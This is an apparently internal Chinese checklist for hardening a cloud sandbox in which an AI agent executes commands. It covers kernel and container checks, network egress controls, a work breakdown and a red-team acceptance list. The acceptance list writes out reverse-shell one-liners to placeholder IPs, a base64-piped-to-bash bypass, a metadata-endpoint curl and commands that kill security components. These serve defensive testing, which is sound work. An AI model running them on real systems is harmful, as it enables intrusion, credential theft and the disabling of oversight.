# 实施清单：环境确认与工作分解

> 版本：v1.0　日期：2026-11-21　配套文档：《云侧沙箱安全管控方案设计》v1.1
> 用法：第一部分逐条在目标沙箱/宿主机上执行并记录结果；第二部分按依赖顺序排期。

---

## 第一部分：环境确认清单

### A. 宿主机与内核能力（决定可用机制与降级路径）

| # | 确认项 | 命令 | 期望/判定 |
|---|--------|------|-----------|
| A1 | 内核版本 | `uname -r` | 3.10/4.x 均可；记录具体版本。影响 fanotify 特性集、无 eBPF |
| A2 | AppArmor 是否启用 | `cat /sys/module/apparmor/parameters/enabled`<br>`aa-status`（宿主机） | `Y` 则可用 AppArmor profile 做路径管控；`N` 或未安装 → 降级为 bind mount + fanotify |
| A3 | SELinux 状态（如为 RHEL/CentOS 系） | `getenforce` | Enforcing → 方案改走 SELinux 策略而非 AppArmor，需另行评估 |
| A4 | seccomp 可用性 | `docker info \| grep -i seccomp` | Docker 18.09 默认开启默认 profile；确认可加自定义 profile（禁 ptrace/mount） |
| A5 | iptables owner match 模块 | 容器内或 netns 内：`iptables -m owner --help` | xt_owner 存在 → 可按 uid 控制出站。owner match 只对 OUTPUT 链本机发出包有效，符合本方案用法 |
| A6 | fanotify 权限事件支持 | 内核 ≥2.6.36 即有 `FAN_OPEN_PERM`；实测写个小程序注册监听验证 | 需要 CAP_SYS_ADMIN（Daemon 有）；用于文件灰名单阻塞确认 |
| A7 | cgroup v1 freezer | `ls /sys/fs/cgroup/freezer` | 存在 → 反连 shell 处置的"先冻结再取证"可用 |
| A8 | Docker 能力模型 | 确认容器可带 `--cap-add NET_ADMIN` 启动，且 Daemon（root）能为子进程降权 | 容器级需要 NET_ADMIN 供 Daemon 配 iptables；Agent 子进程由 Daemon 用 capset 清空。**注意：`--cap-drop=ALL` 是容器级的，与本需求冲突 → 容器带必要 cap 启动，由 Daemon 在 fork Agent 时降权** |

### B. 沙箱镜像内容（攻击面 + 集成依赖）

| # | 确认项 | 命令/方法 | 影响 |
|---|--------|-----------|------|
| B1 | Python 版本 | `python3 --version`（及 `python --version`） | ≥3.8 → 可选 audit hook 减速带；记录全部解释器（python2/perl/ruby/node/lua）一并纳入扫描规则 |
| B2 | 危险工具清单 | `for t in nc ncat netcat socat ssh chisel frp ngrok curl wget perl ruby php lua node busybox gcc; do which $t 2>/dev/null; done` | 产出镜像裁剪清单；curl/wget 保留但走灰名单；busybox 注意其内建 nc |
| B3 | shell 类型 | `ls -l /bin/sh; bash --version` | bash 支持 `/dev/tcp` 反连语法 → 黑名单规则与 Broker 解析需覆盖 |
| B4 | 包管理器 | `which pip pip3 npm apt yum apk` | 存在即纳入"安装类操作默认灰名单" |
| B5 | **OpenClaw 执行链路（最高优先级）** | 阅读 OpenClaw channel 实现：它执行命令时直接 `execve("/bin/bash")`？还是有可配置的 executor/工具层？ | **决定 Broker 集成方式**：可配置执行器 → Broker 接管；写死 execve → 需要包装层（见 §C 工作分解-3）或推动 OpenClaw 改造。这是整个 P0 最大的集成风险点 |
| B6 | OpenClaw 运行身份与启动方式 | 镜像 entrypoint/cmd；运行 uid | 现状是否 root；改造为非 root + 由 Daemon 派生 |
| B7 | 现有挂载 | `docker inspect <容器> \| jq '.[0].Mounts'` 或 `/proc/mounts` | 清点暴露进容器的宿主路径，敏感目录加入"不挂载/只读"清单 |
| B8 | 环境变量中的凭证 | `env`（容器内） | 若云侧 AK/SK 在 env 中 → 必须移到 Daemon 持有、Agent 不可读（需求 7 前提） |

### C. 容器运行时配置

| # | 确认项 | 命令 | 期望 |
|---|--------|------|------|
| C1 | 运行用户 | `docker inspect -f '{{.Config.User}}'` | 现状记录；目标：Agent 非 root |
| C2 | 网络模式 | `docker inspect -f '{{.HostConfig.NetworkMode}}'` | **若为 `host` 必须改为 bridge**——host 模式下入站管控与 owner match 全部失效 |
| C3 | 已发布端口 | `docker port <容器>` | 目标为零；现状有则需迁移到 gateway 反代 |
| C4 | privileged 标志 | `docker inspect -f '{{.HostConfig.Privileged}}'` | 必须 false |
| C5 | 只读根文件系统现状 | `docker inspect -f '{{.HostConfig.ReadonlyRootfs}}'` | 记录改造量 |
| C6 | **容器创建参数的归属** | 找平台/基础设施团队确认：容器的 run 参数谁控制、能否改 | 非技术问题但最关键——镜像、网络模式、cap、挂载都要改容器定义，需排期协调 |
| C7 | DNS 配置 | `cat /etc/resolv.conf`（容器内） | 现状指向；目标指向内部 resolver |

### D. 网络拓扑

| # | 确认项 | 方法 | 影响 |
|---|--------|------|------|
| D1 | 云元数据可达性 | 容器内 `curl --max-time 2 http://169.254.169.254/` | 现状大概率可达 → 必须用 iptables 封禁（防凭证窃取横向） |
| D2 | 内网可达面 | 容器内探测 RFC1918 网段常见端口（网关/DNS 除外） | 产出 `deny_ip_ranges` 终稿；确认 gateway/DNS 的例外地址 |
| D3 | 出站现状 | 容器内 `curl --max-time 3 https://example.com` | 现状直连可达 → 确认上线 iptables 后必须走 proxy 才通（验收用例） |
| D4 | egress proxy 部署位置 | 与网络团队确认：同网络 sidecar 容器 vs 独立服务 | 影响 iptables 指向与 proxy 自身加固方案 |
| D5 | 内部 DNS resolver | 是否有现成内网 DNS 可加 ACL/限速 | 无则需自建（如 dnsmasq/CoreDNS + 插件） |
| D6 | TLS 拦截可行性 | 确认镜像可预置私有 CA 信任库；抽查沙箱内常用工具链（git/pip/npm/curl）是否走系统 CA | 个别客户端证书固定会失败 → 按域名白名单豁免；**拍板是否启用 tls_intercept** |

### E. 云侧与跨团队依赖

| # | 事项 | 对接方 | 需确认内容 |
|---|------|--------|-----------|
| E1 | OpenClaw 执行链路改造 | OpenClaw 团队 | 命令执行入口可否接入 Broker（B5 结论的落地） |
| E2 | HIPS 接口 | **冯经理** | 事件 Schema（ts/pid/uid/事件类型/对象/判定）、传输（Unix socket/gRPC）、判定结果能否回写 Daemon 转阻断 |
| E3 | 策略控制面 | 云侧团队 | 名单 CRUD、版本号、签名密钥体系、推送通道（Daemon 长连接 pull 还是云侧 push）、离线时本地缓存策略 |
| E4 | 审批回调 | 前端/云侧 | 用户确认入口形态；**审批超时行为必须拍板：默认拒绝**；授权累积项的有效期与次数 |
| E5 | OBS | 云侧 | bucket 规划、签名 URL 服务、存储周期、云扫服务（YARA/静态分析）算力归属 |
| E6 | 授权 scope 服务 | 云侧 | scope token 格式、云侧各服务的校验接入点 |

---

## 第二部分：实现工作分解（按依赖排序）

| # | 工作项 | 内容 | 依赖 |
|---|--------|------|------|
| 0 | 环境摸底 | 执行第一部分全部确认项，输出《环境确认报告》，标注每项的"可用/降级/不可用"结论 | — |
| 1 | 镜像改造 | 裁剪危险工具（B2）、建非 root 用户、目录规划（`/workspace`、`/run/safe`、策略目录）、预置私有 CA（如启用 TLS 拦截）、内置 Daemon 二进制 | 0 |
| 2 | Daemon 骨架 | Go 实现：PID 1、僵尸进程回收、自身守护；策略引擎（Schema 解析、签名校验、版本管理、热更新、离线缓存） | 0 |
| 3 | Exec Broker | Unix socket 服务；命令解析（tokenize、软链展开、base64 递归解码）；三名单匹配；verdict 状态机；结构化错误码；**spawn 降权执行器**（setuid→Agent 用户、清 cap、no_new_privs、seccomp 加载）；OpenClaw 集成（依 B5 结论） | 1, 2, E1 |
| 4 | 脚本扫描器 | 分语言危险 API 规则集（socket+dup2+pty 组合直接黑）；`pip/npm install` 默认灰；OBS 上传客户端 + 哈希缓存；云扫判定接口 | 3, E5 |
| 5 | 审批链路 | pending 队列、云侧回调、超时默认拒绝、授权累积 ledger（需求 7 的 scope token 来源） | 3, E4 |
| 6 | 文件管控 | 挂载方案落地（依 A2 结论：AppArmor 或纯 bind mount）；fanotify 灰名单监听；删除隔离区（mv + 确认真删） | 2, 5 |
| 7 | 网络管控 | Daemon init 时装配 iptables（owner match、DROP 元数据/内网、INPUT DROP）；egress proxy（CONNECT 限 443、域名 ACL、大小/超时/会话限制、TLS 拦截[拍板项]、beacon 检测）；内部 DNS resolver（限速/记录类型/高熵检测）；gateway 反代 + 鉴权 | 0(D), 2 |
| 8 | 反连 shell 检测器 | /proc fd 扫描（fd0/1/2 为 socket）、pty 审计、异常父子关系；freeze→取证→kill→上报 | 3, 7 |
| 9 | 事件总线 + HIPS 插件口 | 事件 Schema 实现、socket 服务、缓冲重发；HIPS 判定回写转阻断 | 2, E2 |
| 10 | 云侧控制面 | 策略管理 + 签名推送；审批服务；scope 服务；OBS 签名 URL；云扫服务 | E3–E6 |
| 11 | 测试验证 | **攻击用例集**（见第三部分）；性能测试（Broker 延迟、fanotify 开销、proxy 吞吐）；降级路径验证（关掉 AppArmor/TLS 拦截重跑用例） | 3–9 |
| 12 | 灰度上线 | 审计模式（全量 log-only，观察误报）→ 按类目逐个切 enforce | 11 |

## 第三部分：验收攻击用例集（红队清单）

上线前每条必须通过（预期：阻断或灰名单确认 + 审计事件）：

| 类别 | 用例 |
|------|------|
| 直接反连 | `bash -i >& /dev/tcp/<外部IP>/4444 0>&1`；`nc <IP> 4444 -e /bin/sh`；python socket+dup2+pty.spawn 经典一行 |
| 隧道反连 | chisel/frp 客户端外连；`ssh -R`；WebSocket shell 经 443 |
| 编码绕过 | `echo <base64> \| base64 -d \| bash`；软链接改名执行 |
| 脚本内攻击 | py 脚本内 `os.system("rm -rf …")` / `subprocess` 反连 / 读灰名单文件 |
| 安装时执行 | `pip install <含恶意 setup.py 的包>`；npm postinstall |
| 横向 | `curl 169.254.169.254`；探测内网网关以外地址 |
| 反安全组件 | kill Daemon；改写策略文件；`iptables -F`；`ptrace` Daemon |
| 批量删除 | `rm -rf` 工作目录多文件；脚本循环删除 |
| 数据外发 | 大文件经 proxy 外发（大小限制）；DNS 隧道（iodine 特征） |

## 第四部分：需要拍板的决策

1. **命令默认策略**：default-allow（常规开发命令放行、高危类目拦）还是全量 default-deny 白名单（安全最强、运维最重）——建议前者起步；
2. **TLS 拦截**是否启用（对抗 HTTPS 隧道的强度分水岭，影响开发体验与 CA 运维）；
3. **审批超时行为**：必须默认拒绝（默认放行等于灰名单失效）；
4. **OpenClaw 集成方式**：取决于 B5 摸底结论，是最优先要闭环的事项；
5. egress proxy 选型：Squid（ssl-bump 成熟）vs Envoy vs 自研轻量 CONNECT proxy（行为检测定制空间大）。
